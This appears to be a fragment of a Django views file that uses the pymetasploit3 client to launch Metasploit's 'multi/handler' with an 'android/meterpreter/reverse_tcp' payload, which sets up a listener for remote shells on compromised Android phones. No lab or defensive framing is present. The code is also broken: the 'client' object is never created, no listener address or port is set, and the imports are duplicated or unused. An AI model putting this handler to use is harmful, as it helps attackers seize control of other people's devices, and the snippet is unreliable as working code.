from django.http import HttpResponse, HttpResponseRedirect
from django.template import loader
from django.urls import reverse
from django.views.decorators.csrf import csrf_protect, csrf_exempt
from django.http import HttpResponse
from django.template import RequestContext
import threading
import os
import requests
import json

from pymetasploit3.msfrpc import MsfRpcClient


exploit = client.modules.use("exploit", "multi/handler")
payload = client.modules.use("payload", "android/meterpreter/reverse_tcp")
exploit.execute(payload=payload)
